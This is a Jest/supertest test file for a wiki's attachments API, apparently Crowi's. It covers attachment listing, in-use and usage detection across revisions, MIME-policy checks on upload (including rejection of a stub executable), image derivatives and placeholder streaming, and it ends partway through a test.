import fs from 'node:fs';
import http from 'node:http';
import path from 'node:path';
import { UPLOAD_ALLOWED_MIME } from '@crowi/api-contract';
import { Types } from 'mongoose';
import { app, crowi } from 'src/test/setup';
import {
  bearerAuthHeaders as authHeaders,
  cookieAuthHeaders as cookieHeaders,
  createPageViaApi,
  createTestUser,
  createWideJpeg,
  unsizedStream,
} from 'src/test/test-helpers';
import * as imageDisplayDerivative from 'src/util/image-display-derivative';
import { createJwtUtil } from 'src/util/jwt';
import { UPLOAD_MAX_BYTES_DEFAULT } from 'src/util/upload-limit';
import request from 'supertest';

import { PROFILE_PICTURE_ALLOWED_MIME, PROFILE_PICTURE_MAX_BYTES, UPLOAD_EXT_TO_MIME } from './attachment';

const cleanupPathPrefix = async (prefix: string) => {
  const Page = crowi.model('Page');
  const Revision = crowi.model('Revision');
  const Attachment = crowi.model('Attachment');
  const filter = { path: { $regex: `^${prefix}` } };
  const pages = await Page.find(filter).select('_id').lean();
  const pageIds = pages.map((p: { _id: Types.ObjectId }) => p._id);
  await Promise.all([Page.deleteMany(filter), Revision.deleteMany(filter), Attachment.deleteMany({ page: { $in: pageIds } })]);
};

describe('Routes /api attachments (Hono)', () => {
  const PATH_PREFIX = '/hono-attachment-test/';
  let accessToken: string;
  let otherAccessToken: string;
  let adminAccessToken: string;
  let userId: string;

  // A 1x1 transparent PNG (decoded from base64). Small enough to ship inline
  // and recognisable as a valid image by anything that only sniffs the magic
  // header.
  const pngBuffer = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkAAIAAAoAAv/lxKUAAAAASUVORK5CYII=', 'base64');

  // The placeholder image shipped at `packages/api/public/images/file-not-found.png`,
  // shared by both `GET /attachments/:id` and `GET /attachments/:id/original`
  // placeholder-fallback assertions below.
  let fileNotFoundImage: Buffer;

  // Buffer the raw response bytes so placeholder/image assertions can compare
  // the streamed body directly. Shared by both raw-stream describe blocks below.
  const bufferParser = (response: NodeJS.ReadableStream, callback: (err: Error | null, body: Buffer) => void) => {
    const chunks: Buffer[] = [];
    response.on('data', (chunk: Buffer) => chunks.push(chunk));
    response.on('end', () => callback(null, Buffer.concat(chunks)));
    response.on('error', (err) => callback(err, Buffer.alloc(0)));
  };

  beforeAll(async () => {
    // `crowi` is not booted at module-eval time, so read it lazily here.
    fileNotFoundImage = fs.readFileSync(path.resolve(crowi.publicDir, 'images', 'file-not-found.png'));

    const owner = await createTestUser({
      name: 'Attach Owner',
      username: 'attachOwner',
      email: 'attach-owner@example.com',
    });
    accessToken = owner.accessToken;
    userId = owner.user._id.toString();

    const other = await createTestUser({
      name: 'Attach Other',
      username: 'attachOther',
      email: 'attach-other@example.com',
    });
    otherAccessToken = other.accessToken;

    const admin = await createTestUser({
      name: 'Attach Admin',
      username: 'attachAdmin',
      email: 'attach-admin@example.com',
      admin: true,
    });
    adminAccessToken = admin.accessToken;
  });

  afterEach(() => cleanupPathPrefix(PATH_PREFIX));

  describe('GET /api/pages/:pageId/attachments (list)', () => {
    it('returns 401 without auth', async () => {
      const res = await request(app).get('/api/pages/000000000000000000000000/attachments');
      expect(res.status).toBe(401);
      expect(res.body.error.code).toBe('AUTHENTICATION_REQUIRED');
    });

    it('returns 400 when pageId is malformed', async () => {
      const res = await request(app).get('/api/pages/not-an-objectid/attachments').set(authHeaders(accessToken));
      expect(res.status).toBe(400);
      expect(res.body.error.code).toBe('INVALID_PAGE_ID');
    });

    it('returns 404 when the user has no grant on the page', async () => {
      const ownerCreate = await createPageViaApi(accessToken, `${PATH_PREFIX}private-list`, '# secret', 4 /* GRANT_OWNER */);
      const res = await request(app).get(`/api/pages/${ownerCreate._id}/attachments`).set(authHeaders(otherAccessToken));
      expect(res.status).toBe(404);
      expect(res.body.error.code).toBe('PAGE_NOT_FOUND');
    });

    it('returns an empty list for a public page with no attachments', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}empty-list`, '# nope');
      const res = await request(app).get(`/api/pages/${page._id}/attachments`).set(authHeaders(accessToken));
      expect(res.status).toBe(200);
      expect(res.body.attachments).toEqual([]);
    });
  });

  describe('GET /api/pages/:pageId/attachments — inUse detection (Phase 7)', () => {
    /** Upload a PNG to a page and return its attachment id. */
    const uploadTo = async (pageId: string) => {
      const res = await request(app)
        .post(`/api/pages/${pageId}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(res.status).toBe(200);
      return res.body.attachment._id as string;
    };

    /**
     * Overwrite the page's latest revision body in-place so the
     * `listAttachments` body scan sees it. We mutate the Revision document
     * directly rather than going through `updatePage` so the test does not
     * depend on the editor's optimistic-concurrency `revision_id` handshake.
     */
    const setBody = async (pageId: string, body: string) => {
      const Page = crowi.model('Page');
      const Revision = crowi.model('Revision');
      const page = await Page.findById(pageId);
      if (!page) throw new Error(`page ${pageId} not found`);
      await Revision.updateOne({ _id: page.revision }, { $set: { body } });
    };

    const listOf = async (pageId: string) => {
      const res = await request(app).get(`/api/pages/${pageId}/attachments`).set(authHeaders(accessToken));
      expect(res.status).toBe(200);
      return res.body.attachments as Array<{ _id: string; inUse: boolean }>;
    };

    it('marks an attachment inUse when the latest revision body references its current /api/attachments/<id> URI', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}inuse-new-uri`, '# placeholder');
      const id = await uploadTo(page._id);
      await setBody(page._id, `# doc\n\n![pixel](/api/attachments/${id})\n`);

      const attachments = await listOf(page._id);
      const target = attachments.find((a) => a._id === id);
      expect(target?.inUse).toBe(true);
    });

    it('marks an attachment NOT inUse when the latest revision body does not reference it', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}inuse-unref`, '# placeholder');
      const id = await uploadTo(page._id);
      await setBody(page._id, '# doc with no attachment references\n');

      const attachments = await listOf(page._id);
      const target = attachments.find((a) => a._id === id);
      expect(target?.inUse).toBe(false);
    });

    it('marks an attachment inUse when referenced via the legacy /files/<id> URI', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}inuse-legacy-uri`, '# placeholder');
      const id = await uploadTo(page._id);
      await setBody(page._id, `# doc\n\n![legacy](/files/${id})\n`);

      const attachments = await listOf(page._id);
      const target = attachments.find((a) => a._id === id);
      expect(target?.inUse).toBe(true);
    });

    // Regression (dual-accept, spec §5.2): a body persisted before the
    // /api/v2 -> /api cutover still carries the OLD /api/v2/attachments/<id>
    // form. Dropping this alternative from ATTACHMENT_URI_RE would flip such
    // an attachment to inUse: false, hiding it from the footer list and
    // exposing a delete affordance for something still referenced by the
    // current revision.
    it('marks an attachment inUse when referenced via the legacy (pre-cutover) /api/v2/attachments/<id> URI', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}inuse-legacy-v2-uri`, '# placeholder');
      const id = await uploadTo(page._id);
      await setBody(page._id, `# doc\n\n![pixel](/api/v2/attachments/${id})\n`);

      const attachments = await listOf(page._id);
      const target = attachments.find((a) => a._id === id);
      expect(target?.inUse).toBe(true);
    });

    // Regression: the `/original` suffix API responses embed (`originalUrl`,
    // `${fileUrl}/original`) may be copy-pasted into a body verbatim.
    // ATTACHMENT_URI_RE has no trailing anchor, so it still matches the id
    // regardless of what (if anything) follows it.
    it('marks an attachment inUse when referenced via the legacy .../original suffix form', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}inuse-legacy-original`, '# placeholder');
      const id = await uploadTo(page._id);
      await setBody(page._id, `# doc\n\n![pixel](/api/v2/attachments/${id}/original)\n`);

      const attachments = await listOf(page._id);
      const target = attachments.find((a) => a._id === id);
      expect(target?.inUse).toBe(true);
    });

    it('falls back to inUse=true for every attachment when the latest revision body is empty', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}inuse-empty-body`, '# placeholder');
      const id = await uploadTo(page._id);
      await setBody(page._id, '');

      const attachments = await listOf(page._id);
      const target = attachments.find((a) => a._id === id);
      expect(target?.inUse).toBe(true);
    });

    it('reports inUse=false on the addAttachment (upload) response — a fresh upload is not yet referenced', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}inuse-upload-resp`, '# x');
      const res = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(res.status).toBe(200);
      expect(res.body.attachment.inUse).toBe(false);
    });
  });

  describe('GET /api/pages/:pageId/attachments/usage (Phase 8)', () => {
    /** Upload a PNG to a page and return its attachment id. */
    const uploadTo = async (pageId: string) => {
      const res = await request(app)
        .post(`/api/pages/${pageId}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(res.status).toBe(200);
      return res.body.attachment._id as string;
    };

    /** Overwrite the page's latest revision body in-place. */
    const setLatestBody = async (pageId: string, body: string) => {
      const Page = crowi.model('Page');
      const Revision = crowi.model('Revision');
      const page = await Page.findById(pageId);
      if (!page) throw new Error(`page ${pageId} not found`);
      await Revision.updateOne({ _id: page.revision }, { $set: { body } });
    };

    /**
     * Insert a standalone past revision for the page's path with an explicit
     * `createdAt` so it sorts before the latest revision. It is NOT linked
     * to `page.revision`, so the usage handler treats it as a past revision.
     *
     * DC-5 (`feature-revision-page-ref`): `pageId` is required and stamped
     * onto `page` — the usage handler now resolves by the immutable `page`
     * id (`hono/handlers/attachment.ts`), not `path`, so a revision seeded
     * without it would be invisible to `usageOf` regardless of `pagePath`
     * matching. Pass `null` explicitly to simulate a legacy/orphan row that
     * predates the backfill (no `page` set) for the path-reuse regression
     * test below.
     */
    const addPastRevision = async (pageId: string | null, pagePath: string, body: string, createdAt: Date) => {
      const Revision = crowi.model('Revision');
      const [rev] = await Revision.create([
        {
          path: pagePath,
          ...(pageId !== null ? { page: new Types.ObjectId(pageId) } : {}),
          body,
          format: 'markdown',
          author: new Types.ObjectId(userId),
          createdAt,
        },
      ]);
      return rev._id.toString() as string;
    };

    const usageOf = async (pageId: string) => {
      const res = await request(app).get(`/api/pages/${pageId}/attachments/usage`).set(authHeaders(accessToken));
      expect(res.status).toBe(200);
      return res.body as {
        pagePath: string;
        latest: Array<{ _id: string }>;
        past: Array<{ attachment: { _id: string }; referencingRevisions: Array<{ revisionId: string; createdAt: string }> }>;
      };
    };

    it('returns 401 without auth', async () => {
      const res = await request(app).get('/api/pages/000000000000000000000000/attachments/usage');
      expect(res.status).toBe(401);
      expect(res.body.error.code).toBe('AUTHENTICATION_REQUIRED');
    });

    it('returns 400 when pageId is malformed', async () => {
      const res = await request(app).get('/api/pages/not-an-objectid/attachments/usage').set(authHeaders(accessToken));
      expect(res.status).toBe(400);
      expect(res.body.error.code).toBe('INVALID_PAGE_ID');
    });

    it('returns 404 when the user has no grant on the page', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}usage-private`, '# secret', 4 /* GRANT_OWNER */);
      const res = await request(app).get(`/api/pages/${page._id}/attachments/usage`).set(authHeaders(otherAccessToken));
      expect(res.status).toBe(404);
      expect(res.body.error.code).toBe('PAGE_NOT_FOUND');
    });

    it('puts an attachment referenced by the latest revision in the latest group', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}usage-latest`, '# placeholder');
      const id = await uploadTo(page._id);
      await setLatestBody(page._id, `# doc\n\n![pixel](/api/v2/attachments/${id})\n`);

      const usage = await usageOf(page._id);
      expect(usage.pagePath).toBe(`${PATH_PREFIX}usage-latest`);
      expect(usage.latest.map((a) => a._id)).toContain(id);
      expect(usage.past.map((p) => p.attachment._id)).not.toContain(id);
    });

    it('puts a past-only attachment in the past group with its referencing revisions', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}usage-past`, '# placeholder');
      const id = await uploadTo(page._id);
      // Latest revision does NOT reference it.
      await setLatestBody(page._id, '# doc with no references\n');
      // One past revision references it.
      const pastRevId = await addPastRevision(
        page._id,
        `${PATH_PREFIX}usage-past`,
        `# old\n\n![p](/api/v2/attachments/${id})\n`,
        new Date(Date.now() - 60_000),
      );

      const usage = await usageOf(page._id);
      expect(usage.latest.map((a) => a._id)).not.toContain(id);
      const entry = usage.past.find((p) => p.attachment._id === id);
      expect(entry).toBeDefined();
      expect(entry?.referencingRevisions.map((r) => r.revisionId)).toEqual([pastRevId]);
    });

    it('lists multiple referencing revisions for an attachment used by several past revisions', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}usage-multi`, '# placeholder');
      const id = await uploadTo(page._id);
      await setLatestBody(page._id, '# latest, unrelated\n');
      const older = await addPastRevision(page._id, `${PATH_PREFIX}usage-multi`, `# v1\n\n![p](/files/${id})\n`, new Date(Date.now() - 120_000));
      const newer = await addPastRevision(page._id, `${PATH_PREFIX}usage-multi`, `# v2\n\n![p](/api/v2/attachments/${id})\n`, new Date(Date.now() - 60_000));

      const usage = await usageOf(page._id);
      const entry = usage.past.find((p) => p.attachment._id === id);
      expect(entry).toBeDefined();
      // Newest-first ordering from the handler's sort.
      expect(entry?.referencingRevisions.map((r) => r.revisionId)).toEqual([newer, older]);
    });

    it('puts an orphan attachment (referenced by no revision) in the past group with empty referencingRevisions', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}usage-orphan`, '# placeholder');
      const id = await uploadTo(page._id);
      await setLatestBody(page._id, '# nothing references the file\n');

      const usage = await usageOf(page._id);
      expect(usage.latest.map((a) => a._id)).not.toContain(id);
      const entry = usage.past.find((p) => p.attachment._id === id);
      expect(entry).toBeDefined();
      expect(entry?.referencingRevisions).toEqual([]);
    });

    it('DC-5 regression: does not mix a stranded legacy revision’s metadata into a different page’s usage after a path is reused', async () => {
      const path = `${PATH_PREFIX}usage-path-reuse`;

      // Page B currently owns `path`. A stray legacy revision also sits at
      // this same path string — a stranded row from a PRIOR (now-gone)
      // occupant (standard-lifecycle deviation; no `page` ref, exactly the
      // shape `revision-page-ref-backfill` reports as an unresolved
      // orphan). Its `createdAt` predates B's own revisions.
      const pageB = await createPageViaApi(accessToken, path, '# placeholder B');
      const idB = await uploadTo(pageB._id);
      // B's own latest revision does NOT reference idB, so any
      // `referencingRevisions` entry for it must come from elsewhere.
      await setLatestBody(pageB._id, '# page B body, no references\n');
      const strayRevId = await addPastRevision(null, path, `# stray legacy body\n\n![p](/api/v2/attachments/${idB})\n`, new Date(Date.now() - 120_000));

      const usage = await usageOf(pageB._id);
      const entry = usage.past.find((p) => p.attachment._id === idB);
      expect(entry).toBeDefined();
      // Pre-fix, `Revision.find({ path: page.path })` would have pulled the
      // stray revision into the scan (it shares `path`, not `page`) and
      // attributed its body-reference to page B's usage response —
      // mixing in a revisionId/createdAt/author that has nothing to do
      // with page B's own history.
      expect(entry?.referencingRevisions).toEqual([]);
      expect(entry?.referencingRevisions.some((r) => r.revisionId === strayRevId)).toBe(false);
    });
  });

  describe('POST /api/pages/:pageId/attachments (add)', () => {
    it('returns 401 without auth', async () => {
      const res = await request(app)
        .post('/api/pages/000000000000000000000000/attachments')
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(res.status).toBe(401);
      expect(res.body.error.code).toBe('AUTHENTICATION_REQUIRED');
    });

    it('returns 400 when no file is provided', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}no-file`, '# x');
      const res = await request(app).post(`/api/pages/${page._id}/attachments`).set(authHeaders(accessToken));
      expect(res.status).toBe(400);
      expect(res.body.error.code).toBe('FILE_MISSING');
    });

    it('returns 404 when the page does not exist', async () => {
      const res = await request(app)
        .post('/api/pages/000000000000000000000000/attachments')
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(res.status).toBe(404);
      expect(res.body.error.code).toBe('PAGE_NOT_FOUND');
    });

    it('uploads a file and returns the populated attachment', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}upload`, '# add');

      const res = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });

      expect(res.status).toBe(200);
      expect(res.body.attachment).toBeDefined();
      expect(res.body.attachment._id).toBeDefined();
      expect(res.body.attachment.page).toBe(page._id);
      expect(res.body.attachment.fileFormat).toBe('image/png');
      expect(res.body.attachment.originalName).toBe('pixel.png');
      expect(res.body.attachment.creator._id).toBe(userId);
      expect(res.body.attachment.url).toBe(`/api/attachments/${res.body.attachment._id}`);
      expect(res.body.url).toBe(res.body.attachment.url);

      // The Attachment row exists in the DB.
      const Attachment = crowi.model('Attachment');
      const stored = await Attachment.findById(res.body.attachment._id);
      expect(stored).not.toBeNull();
    });

    describe('feature-attachment-upload-policy — unified MIME policy applied to the general attach route', () => {
      // Before this feature this route had NO MIME check at all (the
      // allow-list only covered the editor's paste/dnd upload) — the
      // symptom that motivated the feature was exactly this: the SAME
      // file uploaded fine here while being rejected by drag-and-drop.

      it('returns 415 DISALLOWED_MIME for a type outside the unified upload allow-list', async () => {
        const page = await createPageViaApi(accessToken, `${PATH_PREFIX}bad-mime`, '# add');
        const res = await request(app)
          .post(`/api/pages/${page._id}/attachments`)
          .set(authHeaders(accessToken))
          .attach('file', Buffer.from('MZ stub executable bytes'), { filename: 'virus.exe', contentType: 'application/x-msdownload' });

        expect(res.status).toBe(415);
        expect(res.body.error.code).toBe('DISALLOWED_MIME');
        // Same wording the editor upload endpoint (`/attachments/upload`)
        // uses for the same reason — AC "拒否時のエラーコードと文言が全経路で統一されている".
        expect(res.body.error.message).toBe('Files of type application/x-msdownload cannot be uploaded.');
      });

      it('accepts a .docx upload (a business document type the old narrow allow-lists rejected)', async () => {
        const page = await createPageViaApi(accessToken, `${PATH_PREFIX}docx`, '# add');
        const res = await request(app)
          .post(`/api/pages/${page._id}/attachments`)
          .set(authHeaders(accessToken))
          .attach('file', Buffer.from('PK stub docx bytes'), {
            filename: 'report.docx',
            contentType: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
          });

        expect(res.status).toBe(200);
        expect(res.body.attachment.fileFormat).toBe('application/vnd.openxmlformats-officedocument.wordprocessingml.document');
      });

      it('accepts a .xlsx upload', async () => {
        const page = await createPageViaApi(accessToken, `${PATH_PREFIX}xlsx`, '# add');
        const res = await request(app)
          .post(`/api/pages/${page._id}/attachments`)
          .set(authHeaders(accessToken))
          .attach('file', Buffer.from('PK stub xlsx bytes'), {
            filename: 'sheet.xlsx',
            contentType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
          });

        expect(res.status).toBe(200);
        expect(res.body.attachment.fileFormat).toBe('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
      });

      it('accepts every media type the CLI (`attach add`) can declare — this route had no MIME check before this feature, so any type CLI could already send must keep working', async () => {
        // Literal copy of the unique MIME values in
        // `packages/cli/src/lib/media-type.ts`'s `EXT_TO_MEDIA_TYPE` (not a
        // cross-package import — `@crowi/api` does not depend on
        // `@crowi/cli`). Keep in sync if that map changes.
        const CLI_DECLARABLE_MIME = [
          'image/png',
          'image/jpeg',
          'image/gif',
          'image/webp',
          'image/bmp',
          'image/avif',
          'image/apng',
          'image/x-icon',
          'image/svg+xml',
          'application/pdf',
          'text/plain',
          'text/markdown',
          'text/csv',
          'application/json',
          'application/xml',
          'text/html',
          'application/msword',
          'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
          'application/vnd.ms-excel',
          'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
          'application/vnd.ms-powerpoint',
          'application/vnd.openxmlformats-officedocument.presentationml.presentation',
          'application/zip',
          'application/gzip',
          'application/x-tar',
          'audio/mpeg',
          'audio/wav',
          'video/mp4',
          'video/webm',
          'video/quicktime',
          // `DEFAULT_MEDIA_TYPE` — `mediaTypeForFilename` falls back to this for
          // an unknown/absent extension, so the CLI can declare it too.
          'application/octet-stream',
        ];
        const page = await createPageViaApi(accessToken, `${PATH_PREFIX}cli-types`, '# add');

        for (const [i, mimeType] of CLI_DECLARABLE_MIME.entries()) {
          const res = await request(app)
            .post(`/api/pages/${page._id}/attachments`)
            .set(authHeaders(accessToken))
            .attach('file', Buffer.from('stub bytes'), { filename: `cli-declared-${i}.bin`, contentType: mimeType });
          expect(res.status).toBe(200);
          expect(res.body.attachment.fileFormat).toBe(mimeType);
        }
      });
    });

    describe('feature-attachment-mime-fallback — server-side extension fallback for an undeclared MIME', () => {
      // AC-1: an `application/octet-stream` (undeclared) `pixel.png` is
      // backfilled to `image/png` in both the response and the stored row.
      it('backfills an octet-stream pixel.png to image/png in the response and the Attachment row', async () => {
        const page = await createPageViaApi(accessToken, `${PATH_PREFIX}mime-fallback-png`, '# add');
        const res = await request(app)
          .post(`/api/pages/${page._id}/attachments`)
          .set(authHeaders(accessToken))
          .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'application/octet-stream' });

        expect(res.status).toBe(200);
        expect(res.body.attachment.fileFormat).toBe('image/png');

        const Attachment = crowi.model('Attachment');
        const stored = await Attachment.findById(res.body.attachment._id);
        expect(stored?.fileFormat).toBe('image/png');
      });

      // AC-3: an explicit non-octet-stream declaration is never overridden by
      // the filename, even when it contradicts the extension.
      it('keeps an explicitly declared image/jpeg even though the filename says .png', async () => {
        const page = await createPageViaApi(accessToken, `${PATH_PREFIX}mime-fallback-explicit`, '# add');
        const res = await request(app)
          .post(`/api/pages/${page._id}/attachments`)
          .set(authHeaders(accessToken))
          .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/jpeg' });

        expect(res.status).toBe(200);
        expect(res.body.attachment.fileFormat).toBe('image/jpeg');

        const Attachment = crowi.model('Attachment');
        const stored = await Attachment.findById(res.body.attachment._id);
        expect(stored?.fileFormat).toBe('image/jpeg');
      });

      // AC-4: an unknown extension, and a filename with no extension at all,
      // both stay application/octet-stream — the fallback never invents a
      // type it isn't confident about.
      it('leaves an unknown extension as application/octet-stream', async () => {
        const page = await createPageViaApi(accessToken, `${PATH_PREFIX}mime-fallback-unknown`, '# add');
        const res = await request(app)
          .post(`/api/pages/${page._id}/attachments`)
          .set(authHeaders(accessToken))
          .attach('file', Buffer.from('stub bytes'), { filename: 'archive.xyz', contentType: 'application/octet-stream' });

        expect(res.status).toBe(200);
        expect(res.body.attachment.fileFormat).toBe('application/octet-stream');

        const Attachment = crowi.model('Attachment');
        const stored = await Attachment.findById(res.body.attachment._id);
        expect(stored?.fileFormat).toBe('application/octet-stream');
      });

      it('leaves an extensionless filename as application/octet-stream', async () => {
        const page = await createPageViaApi(accessToken, `${PATH_PREFIX}mime-fallback-noext`, '# add');
        const res = await request(app)
          .post(`/api/pages/${page._id}/attachments`)
          .set(authHeaders(accessToken))
          .attach('file', Buffer.from('stub bytes'), { filename: 'README', contentType: 'application/octet-stream' });

        expect(res.status).toBe(200);
        expect(res.body.attachment.fileFormat).toBe('application/octet-stream');

        const Attachment = crowi.model('Attachment');
        const stored = await Attachment.findById(res.body.attachment._id);
        expect(stored?.fileFormat).toBe('application/octet-stream');
      });
    });

    describe('feature-image-derivative-optimization Phase 1 — display derivative generation', () => {
      it('calls the shared generator exactly once and persists a resized derivative for a large image', async () => {
        const page = await createPageViaApi(accessToken, `${PATH_PREFIX}derivative-resized`, '# add');
        const wideJpeg = await createWideJpeg();

        const spy = jest.spyOn(imageDisplayDerivative, 'generateDisplayDerivativeForUpload');
        const res = await request(app)
          .post(`/api/pages/${page._id}/attachments`)
          .set(authHeaders(accessToken))
          .attach('file', wideJpeg, { filename: 'wide.jpg', contentType: 'image/jpeg' });

        expect(res.status).toBe(200);
        expect(spy).toHaveBeenCalledTimes(1);

        const Attachment = crowi.model('Attachment');
        const stored = await Attachment.findById(res.body.attachment._id);
        expect(stored?.derivatives?.display?.mode).toBe('resized');
        expect(stored?.derivatives?.display?.format).toBe('image/jpeg');
      });

      it('still returns 200 (original-only) when derivative generation fails — the upload response is never blocked by a generation failure', async () => {
        const page = await createPageViaApi(accessToken, `${PATH_PREFIX}derivative-failed`, '# add');
        // A `Content-Type: image/png` file whose bytes are not a decodable
        // image at all — the generator re-validates via sharp rather than
        // trusting the claimed MIME, so this exercises a real decode
        // failure (mode: failed, reason: decode-error), not a mocked one.
        const garbage = Buffer.from('this is not a real png, just garbage bytes for the upload test');

        const res = await request(app)
          .post(`/api/pages/${page._id}/attachments`)
          .set(authHeaders(accessToken))
          .attach('file', garbage, { filename: 'not-a-png.png', contentType: 'image/png' });

        expect(res.status).toBe(200);
        expect(res.body.attachment).toBeDefined();

        const Attachment = crowi.model('Attachment');
        const stored = await Attachment.findById(res.body.attachment._id);
        expect(stored?.derivatives?.display?.mode).toBe('failed');
        expect(stored?.derivatives?.display?.reason).toBe('decode-error');
      });
    });
  });

  describe('GET /api/attachments/:id (raw stream)', () => {
    it('returns 401 without auth', async () => {
      const res = await request(app).get('/api/attachments/000000000000000000000000');
      expect(res.status).toBe(401);
    });

    it('serves the file-not-found placeholder for a non-existent attachment record', async () => {
      const res = await request(app).get('/api/attachments/000000000000000000000000').set(authHeaders(accessToken)).buffer(true).parse(bufferParser);

      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toBe('image/png');
      const received = res.body as Buffer;
      expect(Buffer.isBuffer(received)).toBe(true);
      expect(received.equals(fileNotFoundImage)).toBe(true);
    });

    it('serves the placeholder when the backing file is missing (local ENOENT)', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}enoent`, '# e');
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(upload.status).toBe(200);
      const id = upload.body.attachment._id;

      // Delete the backing object out from under the still-present record so
      // the local storage driver's `get()` throws `code: 'ENOENT'`.
      const Attachment = crowi.model('Attachment');
      const stored = await Attachment.findById(id);
      const driver = crowi.getPlugins().active.storage;
      if (!driver) throw new Error('storage driver missing in test env');
      await driver.delete(stored.filePath);

      const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);

      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toBe('image/png');
      const received = res.body as Buffer;
      expect(received.equals(fileNotFoundImage)).toBe(true);
    });

    it('serves the placeholder when the storage driver throws a NoSuchKey error (S3)', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}nosuchkey`, '# s3');
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(upload.status).toBe(200);
      const id = upload.body.attachment._id;

      // Simulate the AWS SDK v3 missing-object shape: `name === 'NoSuchKey'`
      // with `$metadata.httpStatusCode === 404` and NO `code` property.
      //
      // `mockImplementation` (not `...Once`): the storage driver is a
      // process-shared singleton, so an in-flight fire-and-forget `get()`
      // from elsewhere could consume a single-shot mock before this request's
      // delivery `get()` runs — leaving the real driver to throw a non-missing
      // error and 500 the request (flaky under parallel load). Rejecting on
      // every call for the span of this test keeps the placeholder path
      // deterministic; `finally` restores the spy.
      const driver = crowi.getPlugins().active.storage;
      if (!driver) throw new Error('storage driver missing in test env');
      const getSpy = jest.spyOn(driver, 'get').mockImplementation(() => {
        const err = Object.assign(new Error('The specified key does not exist.'), {
          name: 'NoSuchKey',
          $metadata: { httpStatusCode: 404 },
        });
        return Promise.reject(err);
      });

      try {
        const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);

        expect(res.status).toBe(200);
        expect(res.headers['content-type']).toBe('image/png');
        const received = res.body as Buffer;
        expect(received.equals(fileNotFoundImage)).toBe(true);
      } finally {
        getSpy.mockRestore();
      }
    });

    it('returns 404 (not the placeholder) when the caller lacks grant on the page', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}grant-fail`, '# secret', 4 /* GRANT_OWNER */);
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(upload.status).toBe(200);
      const id = upload.body.attachment._id;

      const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(otherAccessToken));
      expect(res.status).toBe(404);
      expect(res.body.error.code).toBe('ATTACHMENT_NOT_FOUND');
    });

    it('streams the uploaded bytes back', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}stream`, '# st');
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(upload.status).toBe(200);

      const id = upload.body.attachment._id;
      const res = await request(app)
        .get(`/api/attachments/${id}`)
        .set(authHeaders(accessToken))
        .buffer(true)
        .parse((response, callback) => {
          const chunks: Buffer[] = [];
          response.on('data', (chunk: Buffer) => chunks.push(chunk));
          response.on('end', () => callback(null, Buffer.concat(chunks)));
          response.on('error', (err) => callback(err, Buffer.alloc(0)));
        });

      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toBe('image/png');
      // supertest's custom parser returns a Buffer in res.body
      const received = res.body as Buffer;
      expect(Buffer.isBuffer(received)).toBe(true);
      expect(received.equals(pngBuffer)).toBe(true);
    });

    describe('feature-image-derivative-optimization Phase 2 — display-priority delivery', () => {
      it('serves the display derivative bytes with a MIME Content-Type when derivatives.display.mode is "resized" (display priority, §9 step 3)', async () => {
        const page = await createPageViaApi(accessToken, `${PATH_PREFIX}display-priority`, '# dp');
        const wideJpeg = await createWideJpeg();
        const upload = await request(app)
          .post(`/api/pages/${page._id}/attachments`)
          .set(authHeaders(accessToken))
